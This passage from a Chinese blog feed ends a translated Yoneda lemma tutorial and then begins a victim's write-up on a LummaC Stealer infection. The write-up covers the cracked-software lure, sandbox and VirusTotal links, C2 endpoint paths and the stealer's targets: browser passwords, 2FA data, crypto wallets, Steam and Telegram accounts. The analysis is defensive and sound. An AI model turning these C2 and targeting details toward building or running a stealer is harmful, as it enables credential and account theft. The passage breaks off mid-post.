\mapsto F(f)$ 给出。如果这个映射是单射，我们说 $F$ 忠实(faithful)；如果它是满射，我们说 $F$ 全射(full)；如果它是双射，我们说 $F$ 全忠实(fully faithful)（译者注：相当于此时我们只关心态射在F作用下的变化情况）。以下是一个方便的<a href="http://www.math3ma.com/mathema/2017/7/30/naming-functors">表格</a>，用于命名其他类型的函子。</p><p>(译者注：我将这个有趣的表格直接附在此处↓)<br><img src="/yoneda/naming.jpg" loading="lazy"></p><h2 id="3-3：米田引理-The-Yoneda-Lemma"><a href="#3-3：米田引理-The-Yoneda-Lemma" class="headerlink" title="3&#x2F;3：米田引理(The Yoneda Lemma)"></a>3&#x2F;3：<a name="3"></a>米田引理(The Yoneda Lemma)</h2><p><em>本部分翻译自 <a href="https://www.math3ma.com/blog/the-yoneda-lemma">https://www.math3ma.com/blog/the-yoneda-lemma</a></em></p><p>欢迎来到关于Yoneda引理的第三部分，也是最后一部分！在过去的几周里，我们慢慢揭示了<a href="#1">Yoneda视角</a>背后的数学，即一个对象完全由其与其他对象的关系所决定这一范畴论里的原则(maxim)。</p><p><a href="#2">上周</a>，我们将这一原则分成了两点：</p><blockquote><p><strong>要点 #1.</strong> 关于X的一切我们需要知道的东西都被编码在$\text{hom}(-,X)$中。实际上，对象X<strong>表示</strong>了函子$\text{hom}(-,X)$. </p></blockquote><blockquote><p><strong>要点 #2.</strong> 当且仅当它们所表示的函子$\text{hom}(-,X)$和$\text{hom}(-,Y)$同构时，X和Y才是同构的。</p></blockquote><p>注意到第一点其实是在以不那么严谨的方式表达Yoneda嵌入 $\mathscr{Y}: \mathbf{C} \rightarrow \mathbf{Set}^{op}$ （它将一个对象 $X$ 映射到函子 $\text{hom}(-,X)$）是全忠实的。换句话说，从 $\text{hom}(X,Y)$（一组态射的集合）到 $\mathbf{Nat}(\text{hom}(-,X), \text{hom}(-,Y))$（一组自然变换的集合）的函数将 $f$ 映射到 $f_*$，而这是一个双射。（此处 $f_*$ 将任一个态射 $g:Z\rightarrow X$ 映射到这样的复合： $f\circ g:Z\rightarrow Y$（译者注：也就是与f后复合））。</p><p>这意味着对于每个 $f:X\rightarrow Y$，存在<em>恰好一个</em>由 $f$ 自身构造出(cooked up)的自然变换 $\text{hom}(-,X)\rightarrow \text{hom}(-,Y)$. 反过来，如果 $\eta:\text{hom}(-,X)\rightarrow \text{hom}(-,Y)$ 是任一自然变换，则存在<em>恰好一个</em>由 $\eta$ 自身得到的态射 $X\rightarrow Y$. </p><p><img src="/yoneda/bijection.jpg" loading="lazy"></p><p>现在，有一个简单但至关重要的观察发现：注意到集合 $\text{hom}(X,Y)$ 位于函子 $\text{hom}(-,Y):\mathbf{C}^{op} \rightarrow \mathbf{Set}$ 的像中！”但是，” 你会问， “这重要在哪呢？”</p><p>因为，这让我们可以这样重新表述上周得到的结果：</p><blockquote><p>对于范畴 $\mathbf{C}$ 中的任意对象 $X$，自然变换 $\text{hom}(-,X) \rightarrow \text{hom}(-,Y)$ 与集合 $\text{hom}(X,Y)$ 中的元素双射（一一对应）。</p></blockquote><p>相当简洁，对吧？你知道真正让人惊叹的是什么吗？这个结论不仅对于形如 $\text{hom}(-,Y)$ 的函子成立；它对于从 $\mathbf{C}^{op}$ 到 $\mathbf{Set}$ 的<strong>所有</strong>函子都成立。</p><p><strong>所有！</strong></p><p><em>这</em>就是所谓Yoneda引理。</p><h3 id="Yoneda引理"><a href="#Yoneda引理" class="headerlink" title="Yoneda引理"></a>Yoneda引理</h3><blockquote><p>对于任意函子 $F: \mathbf{C}^{op} \rightarrow \mathbf{Set}$ 和范畴 $\mathbf{C}$ 中的任意对象 $X$，自然变换 $\text{hom}(-,X) \rightarrow F$ 与集合 $F(X)$ 中的元素一一对应。也就是说，<br>$$ \mathbf{Nat}(\text{hom}(-,X), F) \cong F(X) $$</p></blockquote><p>你明白这玩意的重要性了吗？自然变换 $\text{hom}(-,X) \rightarrow F$ 的集合似乎可能是超~级~大~的，一大片浓密的未知、难以驯服和没用的杂草丛。”但是，” Yoneda引理告诉我们，”<em>不是这样的！</em>“ 把F限制在特定对象 $X$ 上应用会得到一个集合F(X)，而<em>只有</em>从该集合中元素“烹饪”而成（构造而来）的自然变换，才是真实存在的自然变换。</p><p>那么这个“烹饪”用到的食谱是什么呢？</p><p>给定 $c \in F(X)$，定义 $\eta: \text{hom}(-,X) \rightarrow F$，通过声明 $\eta _Y: \text{hom}(Y,X) \rightarrow F(Y)$ 为一个将映射 $g: Y \rightarrow X$ 发送到在 $F(Y)$ 中的元素 $Fg(c)$的态射，其中 $Fg$ 表示在 $F$ 作用下映射 $g$ 对应的像。</p><p><img src="/yoneda/F_bijection.jpg" loading="lazy"></p><p>反过来说，任意自然变换 $\eta: \text{hom}(-,X) \rightarrow F$ 只取决于 $F(X)$ 中的一个元素，即 $\eta_X(\text{id}_X)$. 这里 $\eta_X$ 表示态射 $\text{hom}(X,X) \rightarrow F(X)$，而 $\text{id}_X$ 是 $X$ 上的单位态射（译者注：单位态射即为恒等态射 $\text{id}_X \in \text{hom}(X,X)$ ，这里即是序言部分所说“单位态射”起到“凝结核”效果的体现：虽然单位态射是我们唯一已知一定存在的态射，但其他所有态射的去向都被这个单位态射的去向固定了）。</p><p>我们还是要检查这些指派(assignment)（译者注：应该指的是上面两种对偶的说法）是否真的彼此互为逆（以及 $\eta$ 是否真的是一个自然变换）。但正如Tom Leinster<a href="https://arxiv.org/abs/1612.09375">曾经说过</a>的，“理解了问题就等于快知道答案了……只有一种向前进的办法。”</p><p>Yoneda引理的一个直接推论是<a href="#2">上周讨论的内容</a>，这里再次强调：</p><h3 id="Yoneda引理第一推论（要点＃1）"><a href="#Yoneda引理第一推论（要点＃1）" class="headerlink" title="Yoneda引理第一推论（要点＃1）"></a>Yoneda引理第一推论（要点＃1）</h3><blockquote><p><strong>推论1：</strong> Yoneda嵌入 $\mathscr{Y} : \mathbf{C} \rightarrow \mathbf{Set}^{\mathbf{C} }$ 是全忠实的。</p></blockquote><p>映射 $\text{hom}(X,Y) \mapsto \text{Nat}(\text{hom}(-,X), \text{hom}(-,Y))$ 的单射性是显而易见的（如果 $f \neq g$，则 $f_* \neq g_*$）。Yoneda引理则给出满射性。为了证明这一点，将 $F &#x3D; \text{hom}(-,Y)$ 代入引理的陈述中，那么我们得到一个双射<br>$$ \mathbf{Nat}(\text{hom}(-,X), \text{hom}(-,Y)) \cong \text{hom}(X,Y) $$<br>现在设 $\eta : \text{hom}(-,X) \rightarrow \text{hom}(-,Y)$ 是任意的自然变换。我们需要证明存在一个态射 $f : X \rightarrow Y$ 使得 $\eta &#x3D; f_*$. 这里的” $\eta &#x3D; f_*$ “ 意味着对于范畴 $\mathbf{C}$ 中的每个对象 $W$ 和任何映射 $g : W \rightarrow X$，都有<br>$$\eta_W(g) &#x3D; f \circ g$$<br>那么映射 $f$ 应该是什么呢？实际上只有一种选择！根据Yoneda引理，$\eta$ 恰好完全取决于一个态射 $\eta_X(\text{id}_X) : X \rightarrow Y$. 所以我们就选这个！也就是说，<br>$$\text{令} f :&#x3D; \eta_X(\text{id}_X)$$<br>现在我们只需要验证这样是否可行。但根据定义，这样的陈述“$\eta$ 是一个自然变换”意味着对于范畴 $\mathbf{C}$ 中的任意一对对象 $Z$、$W$ 和任何映射 $g : W \rightarrow Z$，我们有等式 $\eta_W \circ g^* &#x3D; g^* \circ \eta_Z$，也就是说，对于任何 $h : Z \rightarrow X$，都有<br>$$\eta_W(h \circ g) &#x3D; \eta_Z(h) \circ g$$</p><p><img src="/yoneda/natural.jpg" loading="lazy"></p><p>由于这对于<em>所有</em> $Z$ 和 $h$ 都成立，所以对于特例： $Z&#x3D;X$ 且 $h&#x3D;\text{id}_X \in \text{hom}(X,X)$ 仍然成立。<br>现在，自然性条件给出的正是我们想要的：对于所有 $g : W \rightarrow X$，都有 $\eta_W(g) &#x3D; fg$. 因此 $\eta &#x3D; f_*$. </p><p>因此，一个对象 $X$ 本质上(effectually)与其可表示函子等效。到目前为止，我们总是专注于反变函子 $\text{hom}(-,X)$，但其实存在Yoneda嵌入的反变版本（以及对应于<em>协变</em>函子版本 $F$ 的Yoneda引理版本）（译者注：即序章部分所述co-Yoneda嵌入与co-Yoneda引理），因此有一个类似的“推论1”，其中 $\text{hom}(-,X)$ 被替换为 $\text{hom}(X,-)$. 但本质是相同的——$X$ 是由其与其他对象的关系决定的。</p><p>更好的是，它是<em>完全地</em>由其与其他对象的关系决定的。这个“完全”一词是由提到过的要点二给出的，实际上它就是Yoneda引理的第二推论。</p><h3 id="Yoneda引理第二推论（要点＃2）"><a href="#Yoneda引理第二推论（要点＃2）" class="headerlink" title="Yoneda引理第二推论（要点＃2）"></a>Yoneda引理第二推论（要点＃2）</h3><blockquote><p>推论2：$X \cong Y \Leftrightarrow \text{hom}(-,X) \cong \text{hom}(-,Y)$. </p></blockquote><p>在一个方向（译者注：$\Rightarrow$）上它显然成立，因为 $Y$ 是一个函子：如果 $X$ 和 $Y$ 是同构的，那么 $\text{hom}(-,X)$ 和 $\text{hom}(-,Y)$ 也是同构的；而另一个方向上（译者注：$\Leftarrow$）也成立则是因为 $Y$ 是全忠实的。有个一般性的事实：如果 $F : \mathbf{C} \rightarrow \mathbf{D}$ 是一个全忠实的函子，并且如果 $F(X) \cong F(Y)$，那么 $X \cong Y$. （证明见本部分脚注。*）</p><p>我们上周看到了这个推论的一个例子：两个拓扑空间 $X$ 和 $Y$ 有相同的势当且仅当 $\text{hom}(\bullet, X) \cong \text{hom}(\bullet, Y)$；它们有相同的路径空间当且仅当 $\text{hom}(I, X) \cong \text{hom}(I, Y)$；它们有相同的环空间当且仅当 $\text{hom}(S^1, X) \cong \text{hom}(S^1, Y)$；等等。用各种空间探测 $X$ 和 $Y$ 会给出更多信息。用<em>所有</em>空间来探测则可以给出<em>所有</em>信息。</p><p><img src="/yoneda/probe2.jpg" loading="lazy"></p><p>当然，观察从 $X$ <em>出发</em>的映射同样能提供有效信息。例如，$X$ 是<a href="http://www.math3ma.com/mathema/2015/9/7/on-connectedness-intuitively">连通的</a>当且仅当每个映射 $X \rightarrow {0,1}$ 都是常值映射。有趣的是，如果我们考虑由Sierpinski拓扑赋予的相同集合 ${0,1}$，那么（<a href="http://www.math3ma.com/mathema/2016/10/6/the-sierpinski-space-and-its-special-property">正如我们之前所见</a>）集合 $\text{hom}(X, {0,1})$ 将得以捕获 $X$ 上的全部拓扑。此外，从 $X$ 到<a href="https://en.wikipedia.org/wiki/Eilenberg%E2%80%93MacLane_space">Eilenberg-MacLane</a>空间的映射在同伦的意义下(up to homotopy)取决于 $X$ 的同调群。另一方面，从 n维球面 到 $X$ 的映射的同伦类塑造了 $X$ 的同伦群。</p><p>如此着重强调态射是Yoneda视角（或者说是Yoneda引理）的结果；<em>一切的关键在于关系！</em></p><p><img src="/yoneda/summary.jpg" loading="lazy"></p><p>我想再用一个例子收尾本文。Yoneda引理有时被描述为群论中<a href="https://en.wikipedia.org/wiki/Cayley%27s_theorem">Cayley定理</a>的推广。确实是这样的。我们可以使用Yoneda引理来<em>证明</em>Cayley定理。</p><hr><h3 id="一个对Cayley定理的证明"><a href="#一个对Cayley定理的证明" class="headerlink" title="一个对Cayley定理的证明"></a>一个对Cayley定理的证明</h3><p>任意群 $G$ 都可以被视为一个范畴，记作 $\mathbf{BG}$，其中有唯一对象 $\bullet$，每个群元素对应一个态射。从 $\mathbf{BG}^{op}$ 到 $\mathbf{Set}$ 的函子 $F$ 被称为右$G$-集合。它将 $\bullet$ 发送到一个集合 $X$，将一个态射（即群元素） $g$ 发送到右乘以 $g$ 的函数 $X \rightarrow X$. 特别地，当 $F &#x3D; \text{hom}(-,\bullet)$ 时，集合 $\text{hom}(\bullet,\bullet)$ 就是 $G$ ，其自身也被视为右$G$-集合。然后根据Yoneda引理，我们有一个双射：</p><p><img src="/yoneda/cayley1.jpg" loading="lazy"></p><p>右边简单来说就是群 $G$ 中的所有元素。但左边呢？首先注意到自然变换 $\text{hom}(-,\bullet) \rightarrow \text{hom}(-,\bullet)$ 就只是 $G$-等变函数 $G \rightarrow G$. </p><p>但它们是哪些 $G$-等变函数呢？根据推论1中的双射，它们是由 $G$ 中的元素构造而成的。简而言之，集合 $\mathbf{Nat}(\text{hom}(\bullet,\bullet), \text{hom}(\bullet,\bullet))$ 就是由所有函数 $f_g : G \rightarrow G$ 构成的，其定义为 $x \mapsto xg$. 而这些<em>恰好</em>是由一个固定元素的乘法得到的 $G$ 的自同态！</p><p><img src="/yoneda/cayley2.jpg" loading="lazy"></p><p>因此左边实际上是所有 $G$ 上的置换的一个子群。而且，根据Yoneda引理，这个子群同构于群 $G$ 本身。这就是Cayley定理。（编辑于2022年12月：上面的图表有些误导。请参阅<a href="https://math.stackexchange.com/questions/4598810/yoneda-lemma-cayley-s-theorem-and-example-with-cyclic-group-mathbbz-6">这个StackExchange帖子</a>。）</p><p>（译者注：简而言之，在上文构造的范畴中，根据Yoneda引理第一推论，$\text{hom}(-,\bullet) \rightarrow \text{hom}(-,\bullet) \cong \text{hom}(\bullet,\bullet)$. $\text{hom}(-,\bullet) \rightarrow \text{hom}(-,\bullet)$ 由态射 $\text{hom}(\bullet,\bullet) \rightarrow \text{hom}(\bullet,\bullet)$ 决定，而 $\text{hom}(\bullet,\bullet) \cong G$，因此该态射也即G到自身的一个置换。故该自然变换范畴同构于G上的置换群的一个子群，而由于 $\text{hom}(\bullet,\bullet) \cong G$, 第一推论将给出其同构于G.）</p><hr><h3 id="延伸阅读"><a href="#延伸阅读" class="headerlink" title="延伸阅读"></a>延伸阅读</h3><p>若想深入了解Yoneda引理，我强烈推荐Tom Leinster的<a href="https://www.amazon.com/Category-Cambridge-Studies-Advanced-Mathematics/dp/1107044243"><em>Basic Category Theory</em></a>以及他阐释得非常清晰的<a href="http://www.maths.ed.ac.uk/~tl/categories/yoneda.ps"><em>The Yoneda Lemma: What’s it All About?</em></a>。我还推荐Emily Riehl的<a href="http://www.math.jhu.edu/~eriehl/context.pdf"><em>Category Theory in Context</em></a>（她的例子特别丰富），以及对于一些真正深奥的数学，可以参考<a href="https://ncatlab.org/nlab/show/Yoneda+lemma">nLab</a>。在这些链接中，你会注意到Yoneda引理还有第三个经典的推论，而我们在本系列中并未涵盖。也许未来的文章中会有！</p><p>如果你喜欢“用其他对象探测对象”的想法，你会很高兴知道这是<em>广义点哲学</em>的一部分。想了解更多可以参考Leinster的<a href="http://www.maths.ed.ac.uk/~tl/elements.pdf"><em>Doing Without Diagrams</em></a>和William Lawvere的<a href="http://www.tac.mta.ca/tac/reprints/articles/11/tr11.pdf"><em>An Elementary Theory of the Category of Sets</em></a>（2005年版本）。</p><p>最后，还有一个很干练灵性的结果叫做密度定理（例如<a href="http://www.math.jhu.edu/~eriehl/context.pdf">这里</a>的定理6.5.8），它告诉我们每个从 $\mathbf{C}^{op}$ 到 $\mathbf{Set}$ 的函子 $F$ 实际上都是由被表示的函子 $\text{hom}(-,X)$ <em>构建</em>而成的。严谨地说，每个这样的 $F$ 都是某些 $\text{hom}(-,X)$ 的<a href="https://en.wikipedia.org/wiki/Limit_(category_theory)">余极限</a>。这确实是一个惊艳的成果（背后有精彩的数学！比如Kan扩展），但我会推迟相关的讨论——我们还没有讨论过<a href="http://www.math3ma.com/mathema/2018/1/2/limits-and-colimits-part-1">余极限或极限</a>！至少目前为止。</p><hr><p>*证明：设 $h : F(X) \rightarrow F(Y)$ 是具有逆 $h^{-1}$ 的同构。由于 $F$ 是全忠实的，存在唯一的态射 $f : X \rightarrow Y$ 使得 $Ff &#x3D; h$ 。类似地，存在唯一的态射 $g : Y \rightarrow X$ 使得 $Fg &#x3D; h^{-1}$ 。因此，<br>$$ \text{id}_{F(X)} &#x3D; h^{-1} \circ h &#x3D; Fg \circ Ff &#x3D; F(fg). $$<br>但 $F(\text{id}_X)$ 映射到 $ \text{id}_{F(X)} $ ，因此由于 $F$ 是忠实的，有 $fg &#x3D; \text{id}_X$ 。类似的论证可证明 $gf &#x3D; \text{id}_Y$ 。因此， $f$ 是一个同构。</p><h2 id="译后记"><a href="#译后记" class="headerlink" title="译后记 "></a>译后记 <a name="postlude"></a></h2><p>译者的知识水平非常有限，难免有一些错误，希望读者见谅，也欢迎斧正。比如在序言部分对引理的解读是否有失偏颇乃至存在误导？<br>此外，这是我第一次正经翻译文章，所以也期盼在结构、句式、术语上的翻译建议<code>:)</code><br>例如，本文将”vantage point”翻译为“视点”，将”cooked up from”翻译为“由……构造而来”，”gives rise to”翻译为“取决于”，不知是否有更优的选择。<br>欢迎交流探讨^_^</p><h2 id="译者推荐阅读"><a href="#译者推荐阅读" class="headerlink" title="译者推荐阅读"></a>译者推荐阅读</h2><p>如果你喜欢可视化或偏直觉的阐释，请务必读一读：<br><a href="https://bartoszmilewski.com/2014/10/28/category-theory-for-programmers-the-preface/trackback/">Category Theory for Programmers: The Preface (by Bartosz Milewski)</a> （本文对应章节：<a href="https://bartoszmilewski.com/2015/09/01/the-yoneda-lemma/trackback/">The Yoneda Lemma</a>）<br>偏数学方向的推荐：<br><a href="https://www.wwli.asia/downloads/books/Al-jabr-1.pdf">代数学方法：第一卷（李文威 著）</a><br>偏计算机方向的推荐：<br><a href="https://people.mpi-sws.org/~dreyer/courses/catlogic/jacobs.pdf">Categorical Logic and Type Theory (by B. Jacobs)</a></p>]]></content>
      
      
      <categories>
          
          <category> Computer Science and Math </category>
          
          <category> Category Theory </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Translation </tag>
            
            <tag> Yoneda Lemma </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对木马LummaC Stealer样本极简的一次分析</title>
      <link href="/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/"/>
      <url>/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>本文带你通过公开的网站分析捕获的恶意程序。</p><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>电脑被人借用时，下盗版软件下到一个一看就是下崽器的东西，但是估计他没多想，我也没多想。2023-10-15</p><h2 id="铺垫"><a href="#铺垫" class="headerlink" title="铺垫"></a>铺垫</h2><p>火绒日志被清空</p><p>谷歌报恶意软件活动 强制退出</p><p>GitHub被标记为spam</p><p>数字签名的一些驱动被篡改</p><h2 id="高潮"><a href="#高潮" class="headerlink" title="高潮"></a>高潮</h2><p>Steam被盗 2023-11-07</p><p>邮箱被改绑</p><p>追回：找客服撕逼</p><p>事实上，在邮箱里能找到“已删除”的邮件：</p><p><img src="/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/1.png" alt="一分钟内完成验证改绑与删除邮件" loading="lazy"></p><p>一分钟内完成验证改绑与删除邮件</p><p><img src="/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/2.png" alt="Untitled" loading="lazy"></p><p><img src="/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/3.png" alt="Untitled" loading="lazy"></p><h2 id="诱因-基本情况"><a href="#诱因-基本情况" class="headerlink" title="诱因&amp;基本情况"></a>诱因&amp;基本情况</h2><p>病毒文件来源：</p><p><a href="https://[REDACTED].com/guitar-pro-crack/">https:&#x2F;&#x2F;[REDACTED].click&#x2F;cgi-sys&#x2F;defaultwebpage.cgi</a></p><p>→https:&#x2F;&#x2F;[REDACTED].click&#x2F;?i&#x3D;Guitar-Pro-8-3-3-Crack-With-License-Key-2023-Free-Download&amp;u&#x3D;1699615197&amp;t&#x3D;17</p><p>→https:&#x2F;&#x2F;[REDACTED].cfd&#x2F;</p><p>→Passwd.2024.Setap.rar</p><blockquote><p>💡 2023-11-11 Update: 文件被更新<br>→<a href="https://href.li/?https://%5BREDACTED%5D.cfd/?h=rfbnUPMSF5l2DcQuKxs0C7YH61W3ipvtZ&amp;s=17&amp;f=Guitar-Pro-8-3-3-Crack-With-License-Key-2023-Free-Download">https://href.li/?https://[REDACTED].cfd/?h=rfbnUPMSF5l2DcQuKxs0C7YH61W3ipvtZ&amp;s=17&amp;f=Guitar-Pro-8-3-3-Crack-With-License-Key-2023-Free-Download</a></p></blockquote><h2 id="线索分析：LummaC2-V4-0"><a href="#线索分析：LummaC2-V4-0" class="headerlink" title="线索分析：LummaC2 V4.0 ?"></a>线索分析：LummaC2 V4.0 ?</h2><h3 id="病毒样本分析结果"><a href="#病毒样本分析结果" class="headerlink" title="病毒样本分析结果"></a>病毒样本分析结果</h3><p><a href="https://www.virustotal.com/gui/file/6ea22a21e9815986454f3b9c3dbdea9df158aad847b0620263e7524ea0cef5ba/behavior">https://www.virustotal.com/gui/file/6ea22a21e9815986454f3b9c3dbdea9df158aad847b0620263e7524ea0cef5ba/behavior</a></p><p><a href="https://www.virustotal.com/gui/file/8735ce3942864b8031fe311bdb1e77ece23e9f6794953a038484cee3e185bc09/behavior">https://www.virustotal.com/gui/file/8735ce3942864b8031fe311bdb1e77ece23e9f6794953a038484cee3e185bc09/behavior</a></p><p><a href="https://www.joesandbox.com/analysis/1293164/0/html">https://www.joesandbox.com/analysis/1293164/0/html</a></p><p><img src="/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/4.png" alt="Untitled" loading="lazy"></p><p><strong>被删除的邮件时间在1min内，且没有用的邮件处于未读状态：提示规模化的自动化利用</strong></p><p><strong>LummaC Stealer样本</strong></p><p>木马本体编写：俄罗斯（MaaS）</p><p>木马外包装：中国（数字签名）</p><p>木马使用者：乌克兰-文尼察Oblast</p><p>木马的C2网站注册于：2023-10-11</p><p>木马下载于：2023-1015</p><p>样本首次被分析：2023-10-14</p><p>发作日期：至少2023-11-4以前</p><p><a href="https://twitter.com/anyrun_app/status/1698643550567579991">https://twitter.com/anyrun_app/status/1698643550567579991</a></p><p>这篇推文指出在其C2服务器的<code>/c2conf</code> 可以查看其配置。<strong>注意：该木马可以执行携带的payload! 例如EXE, PowerShell</strong></p><p><strong>我注意到本机PowerShell的安全等级被设置为”Unrestricted”, 并不是默认的等级危险!!!</strong></p><p>此外木马似乎还请求了另一恶意软件(伪装成<code>clip.exe</code>)：<a href="https://bazaar.abuse.ch/sample/fe3f04adc1fb9922ee259a9f355a79bb8cfac741d3490b4372cb80fe287877b1/">https://bazaar.abuse.ch/sample/fe3f04adc1fb9922ee259a9f355a79bb8cfac741d3490b4372cb80fe287877b1/</a></p><p><a href="https://app.any.run/tasks/c1bd75b1-c7fd-4d57-86cd-77161313a399/">https://app.any.run/tasks/c1bd75b1-c7fd-4d57-86cd-77161313a399/</a></p><p>提示<strong>RaccoonStealer， 但也有可能是Amadey：</strong></p><p><a href="https://app.any.run/tasks/8d233d7c-bdc5-4feb-b02b-a5fa1e32f1cf/">https://app.any.run/tasks/8d233d7c-bdc5-4feb-b02b-a5fa1e32f1cf/</a></p><p>我怀疑这个被检测出虚拟环境了直接crash了。</p><p>相比之下是比较粗糙的一个。</p><p>本事件中没有执行恶意指令似乎，也许是C2没有下发命令。AnyRun这个在10-25才有的记录</p><p>没有网络连接，但是设置计划任务以实现持久化(远程控制？)。</p><h3 id="对LummaC-Stealer已有的分析"><a href="#对LummaC-Stealer已有的分析" class="headerlink" title="对LummaC Stealer已有的分析"></a>对LummaC Stealer已有的分析</h3><p><a href="https://www.esentire.com/blog/the-case-of-lummac2-v4-0">https://www.esentire.com/blog/the-case-of-lummac2-v4-0</a> （最贴合的）</p><p><a href="https://ja.darktrace.com/blog/the-rise-of-the-lumma-info-stealer">https://ja.darktrace.com/blog/the-rise-of-the-lumma-info-stealer</a></p><p><a href="https://blogs.vmware.com/security/2023/10/an-ilummanation-on-lummastealer.html">https://blogs.vmware.com/security/2023/10/an-ilummanation-on-lummastealer.html</a></p><p><a href="https://twitter.com/anyrun_app/status/1698643550567579991">https://twitter.com/anyrun_app/status/1698643550567579991</a></p><p><a href="https://asec.ahnlab.com/en/50594/">https://asec.ahnlab.com/en/50594/</a> (还真是主要靠虚假的破解软件传播)</p><h3 id="利用脚本分析"><a href="#利用脚本分析" class="headerlink" title="利用脚本分析"></a>利用脚本分析</h3><p><a href="https://github.com/esThreatIntelligence/RussianPanda_tools/blob/main/lummac2_config_extractor_build.py">https://github.com/esThreatIntelligence/RussianPanda_tools/blob/main/lummac2_config_extractor_build.py</a></p><p><a href="https://github.com/esThreatIntelligence/RussianPanda/blob/main/lummac2_fetch_config_from_C2.py">https://github.com/esThreatIntelligence/RussianPanda/blob/main/lummac2_fetch_config_from_C2.py</a></p><p>没有找到。这可能证实其使用C2服务器下发配置而非像老版本嵌入。</p><p>但是在Finsin的网站中找到了类似的URL，</p><p>包含</p><p><a href="http://[REDACTED].fun/">http:&#x2F;&#x2F;[REDACTED].fun</a></p><p><a href="http://[REDACTED].pw/">http:&#x2F;&#x2F;[REDACTED].pw</a></p><p>等。</p><p>这些Host似乎出自同一主体。好消息：<strong>只要找到其中一个正在工作的服务器，我们至少可以知道对方做了什么！</strong></p><p>我们尝试发包：</p><p><img src="/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/5.png" alt="Untitled" loading="lazy"></p><p><img src="/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/6.png" alt="Untitled" loading="lazy"></p><p><img src="/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/7.png" alt="Untitled" loading="lazy"></p><p><img src="/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/8.png" alt="Untitled" loading="lazy"></p><p><img src="/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/9.png" alt="Untitled" loading="lazy"></p><p>本次的样本对应C2服务器: [REDACTED].fun</p><p><code>/api</code> <code>/c2conf</code> <code>/c2sock</code></p><h3 id="沙盒分析"><a href="#沙盒分析" class="headerlink" title="沙盒分析"></a>沙盒分析</h3><p><a href="https://app.any.run/tasks/e66e2b32-73ae-4962-95e2-98c143fba6e4">https://app.any.run/tasks/e66e2b32-73ae-4962-95e2-98c143fba6e4</a></p><p>没有什么收获。因为C&amp;C Server Down了</p><p>C2配置：（见文末）</p><p>可以看出目标有：</p><ul><li>用户目录下的txt文件</li><li>用户目录下文件名含有<code>key</code> 的文件</li><li>用户目录下可能是加密货币敏感信息的相关文件</li><li>浏览器中加密货币的插件<strong>（确认泄露）</strong></li><li><strong>两步验证软件数据</strong></li><li>浏览器数据、<strong>自动填充和密码管理器中的数据（确认泄露）</strong></li><li>浏览器<strong>所有历史记录（确认泄露）</strong></li><li><strong>Steam账户敏感数据（确认泄露）</strong></li><li><strong>Telegram账号敏感数据（确认泄露）</strong></li><li>环境信息：进程、系统、硬件、已安装软件<strong>（确认泄露）</strong></li></ul><p>事实上还可能包括：</p><ul><li>文档目录中的图片</li><li>注入正在运行的进程实现可持久化</li></ul><p>但就这次来看，攻击者选择捞一波就结束。</p><p>窃取的信息以<code>.zip</code> 格式上传，内容示例：</p><p><img src="/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/10.png" alt="安装的软件" loading="lazy"></p><p>安装的软件</p><p><img src="/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/11.png" alt="进程，最后两个即为病毒" loading="lazy"></p><p>进程，最后两个即为病毒</p><p><img src="/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/12.png" alt="系统信息与Lumma标识符" loading="lazy"></p><p>系统信息与Lumma标识符</p><p><img 